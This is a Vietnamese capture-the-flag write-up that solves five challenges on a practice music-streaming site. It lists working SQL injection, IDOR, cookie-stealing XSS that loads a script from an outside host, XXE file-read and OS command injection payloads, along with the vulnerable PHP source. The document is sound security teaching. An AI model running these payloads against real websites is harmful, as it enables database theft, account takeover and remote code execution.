---
title: WRITEUP FINAL EXAM 0x08 - COOKIEARENA
category: Final Exam - CookieArena
tags: [idor, sqli, xss, xxe, cmdi, final-exam-cookiearena]
---

Final Exam 0x08 này mô phỏng một trang web nghe nhạc trực tuyến. Trang web có những chức năng chính như sau:

- **Guest:** Login, Register, Play song, Download song, Choose lyric, View public playlist.
- **User:** Play song, Download song, Choose lyric, View public playlist, Create playlist, Logout.
- **Admin:** Play song, Download song, Choose lyric, View public playlist, Create playlist, Add Lyric, Logout.

Các bạn có thể truy cập vào challenge tại [đây](https://battle.cookiearena.org/arenas/final-exam-0x08).

## INFORMATION GATHERING

Dựa vào hint mà tác giả cung cấp và công cụ [Wappalyzer](https://www.wappalyzer.com/) mình đã có được thông tin về hệ thống:

- **Programming Language:** PHP.
- **Server:** Ngnix.
- **DB:** MySQL.
- **Root path:** /www
- **Port Internal:** 127.0.0.1:1377

![image](https://hackmd.io/_uploads/S16nxP4QR.png)

![image](https://hackmd.io/_uploads/r1X-bD4QA.png)

## K08FE FLAG 01

![image](https://hackmd.io/_uploads/SyxAzDNmA.png)

> Flag số 1 nằm ở đâu đó trong cơ sở dữ liệu. Hãy thực hiện đọc cơ sở dữ liệu và lấy Flag.

Sau khi dùng thử trang web thì chức năng mình để ý tới là chức năng "View playlist" nhận tham số `id` có thể bị lỗ hổng SQLi.

### Enumeration:

Đầu tiên mình sẽ sử dụng payload: `1 OR 1=1-- -` thì kết quả trả về là list toàn bộ bài hát trong hệ thống.

![image](https://hackmd.io/_uploads/H1uaDPEmR.png)

Mình thử thêm một payload khác: `999999 OR 1=1-- -` thì kết quả trả về cũng tương tự như payload trên. Đến đây mình có thể kết luận tham số `id` có chứa lỗ hổng SQLi.

![image](https://hackmd.io/_uploads/B1gQYvE7R.png)

### Exploit:

Ở trường hợp này, mình có thể quan sát được kết quả trả về của câu truy vấn nên mình sẽ dùng kiểu tấn công Union-based. Dưới đây là các bước mà mình thực hiện.

1. **Xác định số cột trong bảng hiện tại.**
   - Payload: `1 ORDER BY 6-- -`.
   - Kết quả: ![image](https://hackmd.io/_uploads/rJj0iPE7R.png)
2. **Xác định các cột hiển thị kết quả.**
   - Payload: `99999 UNION SELECT 1,2,3,4,995,996-- -`.
   - Kết quả: Cột số 2, 3, 5, 6 hiển thị kết quả.
     ![image](https://hackmd.io/_uploads/SkwvnPE70.png)
3. **Trích tên các bảng trong DB hiện tại.**
   - Payload: `99999 UNION SELECT 991,992,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),994,995,996-- -`.
   - Kết quả: `playlist_songs,  playlists, users, songs, flag_1`.
     ![image](https://hackmd.io/_uploads/BJlJCD4XC.png)
4. **Trích xuất tên cột trong bảng flag_1.**

   - Payload: `99999 UNION SELECT 991,992,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=0x666C61675F31),994,995,996-- -`.
   - Kết quả: Bảng có 1 cột có tên là `flag`.
     ![image](https://hackmd.io/_uploads/r1Nf1d4mA.png)

   <div class="alert alert-info">
    <strong>📝Note:</strong> Tên bảng có thể truyền vào dưới dạng hex.
   <div/>

5. **Trích xuất dữ liệu trong bảng flag.**

   - Payload: `99999 UNION SELECT 991,992,(SELECT flag FROM flag_1),994,995,996-- -`.
   - Kết quả:
     ![image](https://hackmd.io/_uploads/B1XqkuEQA.png)

    <div class="alert alert-success">
        <strong>🚩FLAG 1:</strong> CHH{Sup3r_s1MpL3_SQL_1Nj3cti0n_HehEH3}
    </div>

## K08FE FLAG 02

![image](https://hackmd.io/_uploads/Byh2euVXA.png)

> Flag số 2 nằm trong một playlist Private của người dùng samuel. Hãy tìm cách đọc Flag 2.

Chức năng mình để ý tới trong flag 2 này vẫn là chức năng "View playlist" vì thông tham số `id` mình có thể xem được những playlist khác. Có thể chức năng này có chứa lỗ hổng IDOR.

### Enumeration:

Đầu tiên, mình sẽ tạo một playlist mới để xem playlist mình mới tạo có `id` là bao nhiêu.

![image](https://hackmd.io/_uploads/H15tMONmR.png)

Và nó có `id=16` vậy là trong trang web có tổng số 16 playlist. Mà khi truy cập vào playlist có `id=11` thì trạng thái của nó lại là `private`. Vậy mình có thể kết luận rằng chức năng "View playlist" có chứa lỗ hổng IDOR.

![image](https://hackmd.io/_uploads/r1OFmuNQC.png)

### Exploit:

Mình sẽ sử dụng tính năng Intruder trong BurpSuite để tìm kiếm playlist có chứa flag.

![image](https://hackmd.io/_uploads/Hyx_V_NmR.png)
![image](https://hackmd.io/_uploads/ry4tE_VmR.png)
![image](https://hackmd.io/_uploads/HkdTVOVQA.png)

<div class="alert alert-success">
    <strong>🚩FLAG 2:</strong> CHH{IDOR_vUlN3r4b1Lit13S_4r3_ea5Y_t0_f1nD}
</div>

## K08FE FLAG 03

![image](https://hackmd.io/_uploads/S1OXB_EmR.png)

> Flag 3 nằm trong Bio của tài khoản admin. Hãy tìm cách đăng nhập tài khoản admin và lấy Flag.

Chức năng "Create playlist" sẽ cho phép người dùng tạo một playlist và đăng nó ở chế độ `public` hoặc `private`. Khi playlist được đăng ở chế độ `public` thì admin sẽ vào review playlist đó. Ở trường hợp này, mình có nghĩ tới lỗ hổng XSS dùng để đánh cắp cookie của admin.

### Enumeration:

Mình sẽ tạo một playlist ở dạng public với `playlist_name=<script>alert(1)</script>` và `playlist_description=<script>alert(1)</script>`.

![image](https://hackmd.io/_uploads/rJxLwdE7C.png)

Và đây là kết quả khi mình chuyển sang trang "Playlist".

![image](https://hackmd.io/_uploads/ByEqw_4Q0.png)

Đến đây thì mình đã chắc chắn rằng chức năng "Create playlist" có chứa lỗ hổng XSS.

### Exploit:

Với challenge số 3 này, mình sẽ sử dụng một trang web có tên là [XSS Hunter](https://xsshunter.trufflesecurity.com/). Đại loại là khi admin vào review playlist của mình thì nó sẽ tự động tạo một request và gửi kết quả tới trang XSS Hunter từ đó mình có thể lấy được cookie của admin.

Payload cho playlist_name và playlist_description: `"><script src="https://js.rip/3a2ry34fas"></script>`.

![image](https://hackmd.io/_uploads/B14uuOEQA.png)

Sau khoảng 3 phút chờ đợi, mình đã lấy được cookie có chứa SessionID của admin.

![image](https://hackmd.io/_uploads/S1Hq3Y4XA.png)

Giờ chỉ cần truy cập vào profile rồi set cookie như trong ảnh là ta đã lấy được flag số 3.

![image](https://hackmd.io/_uploads/rkjmTtN7C.png)

<div class="alert alert-success">
    <strong>🚩FLAG 3:</strong> CHH{sH0uld_s4niT1z3_y0ur_1nPuT_f1r5T}
</div>

## K08FE FLAG 04

![image](https://hackmd.io/_uploads/rk55tuVQA.png)

> Flag 4 nằm bên trong file pages/download-music.php. Hãy tìm cách đọc file này và lấy Flag.

Sau khi đăng nhập thành công vào tài khoản của admin thì ta có thêm chức năng "Add lyric". Chức năng này cho phép admin có thể upload 1 file có định dạng XML lên trên hệ thống. Nói đến XML thì mình nghĩ đến lỗ hổng XXE, lỗ hổng này có thể dùng để đọc file trong hệ thống.

### Enumeration:

Để chứng minh giả thuyết của mình là đúng thì mình sẽ tiến hành đọc file `/etc/passwd`. Mình tải file xml mẫu trên hệ thống về và tiến hành chèn thêm payload vào.

![image](https://hackmd.io/_uploads/Bkpf9EP7C.png)

![image](https://hackmd.io/_uploads/ry6aF4PQA.png)

Và đây là kết quả khi mình upload file lên.

![image](https://hackmd.io/_uploads/B1rBRED7R.png)

Vậy chức năng "Add lyric" có chứa lỗ hổng XXE. Giờ thì sang tiến hành khai thác lấy flag thôi.

### Exploit:

Vì nội dung mình muốn lấy là 1 file php nên mình sẽ sử dụng PHP Wrapper để encode nội dung file sang dạng base64. Payload: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/www/pages/download-music.php"> ]>`.

![image](https://hackmd.io/_uploads/r1NAJrwQR.png)

Giờ chỉ cần decode đoạn mã base64 kia là mình sẽ có được flag số 4.

![image](https://hackmd.io/_uploads/HyhNgHwXR.png)

<div class="alert alert-success">
    <strong>🚩FLAG 4:</strong> CHH{l0_H0n6_XXE_n4y_N0_4o_tH4T_d4y}
</div>

## K08FE Start Me Now

![image](https://hackmd.io/_uploads/Hkyf-rvXA.png)

> Flag cuối nằm tại /flagXXXX.txt. Hãy tìm cách đọc Flag.

Do flag cuối cùng ở vị trí `/flagXXXX.txt` và flag có dạng `flagXXXX.txt` nên mình cách mà mình nghĩ đến trong trường hợp này là: Upload web shell hoặc dùng CMDi để đọc flag. Còn một chức năng nữa mà mình chưa test đó là chức năng "Download song", có thể flag cuối cùng liên quan đến chức năng này.

### Enumeration:

Qua flag số 4 vừa nãy, mình có lấy được 1 đoạn source code của challenge.

```php
// Source code "download-music.php"
<?php
  $flag_4 = 'CHH{l0_H0n6_XXE_n4y_N0_4o_tH4T_d4y}'; // day la flag 4 nhe (=｀ω ´=)
  function encrypt($data, $flag_4) {
    $salt = substr($flag_4, 0, 16);
    $iv = substr($flag_4, 16, 16);

    $ciphertext = openssl_encrypt($data, 'aes-256-cbc', $flag_4, OPENSSL_RAW_DATA, $iv);

    return base64_encode($salt . $iv . $ciphertext);
}

function decrypt($data, $flag_4) {
    $data = base64_decode($data);

    $salt = substr($data, 0, 16);
    $iv = substr($data, 16, 16);
    $ciphertext = substr($data, 32);

    $plaintext = openssl_decrypt($ciphertext, 'aes-256-cbc', $flag_4, OPENSSL_RAW_DATA, $iv);

    return $plaintext;
}

  if (isset($_GET['download'])) {
    $encrypted = rawurldecode($_GET['download']);
    $decrypted = decrypt($encrypted, $flag_4);

    shell_exec('cp '.$decrypted.' /www/download');
    header('Location: download');
  }
?>
```

Sau khi đọc source code có 3 điểm mình để ý như sau:

1. Hàm `shell_exec`: Được gọi để thực thi câu lệnh của OS, rất có thể đây là chỗ gây ra lỗ hổng. Biến `$decrypted` được nối vào trong câu lệnh.
2. Biến `$decrypted`: Biến này có nhiệm vụ lưu trữ dữ liệu được giải mã của hàm `decrypt()`. Hàm `decrypt($data, $flag_4)` nhận vào 1 tham số là `$data` (dữ liệu được mã hoá) và `$flag_4` để giải mã `$data` ra bản rõ. Và `$data` trong trường hợp này chính là `$encrypted`.
3. Biến `$encrypted`: Là biến lưu trữ dữ liệu đã được xử lý thông qua hàm `rawurldecode()`. Hàm `rawurldecode()` lại nhận `$_GET['download']` từ GET Method.

Mà param `download` ta có thể kiểm soát được và kết hợp với việc biết cách hoạt động hai hàm `decrypt()`, `encrypt()` thì ta có thể kiểm soát câu lệnh được thực thi trong hàm `shell_exec()`.

![image](https://hackmd.io/_uploads/H1Y_qBvQ0.png)

Khi ấn vào icon download thì 1 HTTP Request với GET Method được gửi kèm theo một param là `download`. Mình sẽ thử decrypt chuỗi trong param `download` này bằng cách sử dụng đoạn code `download-music.php`.

![image](https://hackmd.io/_uploads/HkMuoSvXC.png)

Chuỗi được gửi đi trong param `download` chính là chuỗi `audio/an_than_low_g_thang.mp3` đã được encrypt.
=> Câu lệnh hàm `shell_exec()` thực thi sẽ là `cp audio/an_than_low_g_thang.mp3`. Vậy mình sẽ thử tạo ra 1 file `info.php` trên hệ thống.

Payload: `Q0hIe2wwX0gwbjZfWFhFX240eV9OMF80b190SDRUX2Sq0MtNgBUzcJraFQNYR5Ehn4fAwicLbfGTDjhJBbFaUNaXxncRoinyQeVgkZEBhJQ=`.

![image](https://hackmd.io/_uploads/HkURl8wXC.png)

![image](https://hackmd.io/_uploads/S1KgbLDXR.png)

Vậy là mình có thể tạo ra 1 file `info.php` ngay trên server. Giờ đến bước khai thác để lấy flag cuối thôi!!!

### Exploit:

Mình sẽ tạo 1 con web shell lên trên server.

Bạn cũng có thể đọc luôn flag mà không cần tạo web shell.

- **Payload encrypt:** `Q0hIe2wwX0gwbjZfWFhFX240eV9OMF80b190SDRUX2TaOtdY26ZcIVgoAnErkSZttwWonTnUFJkLPzwqvD8UKeuFkNkgshhtJ4BdG0oNoyUgAuf2nrXs67V36JOi9Cpb`.
- **Payload decrypt:** `$(echo \"<?php system('cat /flag*.txt');?>\" > /www/flag.php)`.

Payload: `Q0hIe2wwX0gwbjZfWFhFX240eV9OMF80b190SDRUX2Sy43Tl6Dtd6Gn9vsehQUrhQUVuNSRLQWkRJWJ/76E72TH/afrNdBaXtmSviuLh3vEw/GUA023d80GpwspdBnAO`.

![image](https://hackmd.io/_uploads/SJqwMUwmC.png)

![image](https://hackmd.io/_uploads/rkq9z8P7A.png)

![image](https://hackmd.io/_uploads/HyLnMLvX0.png)

<div class="alert alert-success">
    <strong>🚩FLAG 5:</strong> CHH{o5_C0mM4nD_iNj3cTi0n_c4n_aR1s3_4nYwH3re_df59576e47e3385c7e8f604123eeffb3}
</div>

## TỔNG KẾT:

1. **FLAG 1:** Lỗ hổng SQL Injection ở tham số `id` (Endpoint: /lyric.php).
2. **FLAG 2:** Lỗ hổng IDOR ở tham số `id` (Endpoint: /lyric.php).
3. **FLAG 3:** Lỗ hổng XSS ở chức năng "Create playlist" (Endpoint: /pages/create-playlist.php).
4. **FLAG 4:** Lỗ hổng XXE ở chức năng "Add lyric" (Chỉ có ở account của admin).
5. **FLAG 5:** Lỗ hổng OS Command Injection ở tham số `download`.

Cảm ơn các bạn vì đã đọc đến đây! Nếu có sai sót gì trong quá trình giải challenge mong các bạn góp ý với mình ở phần comment!
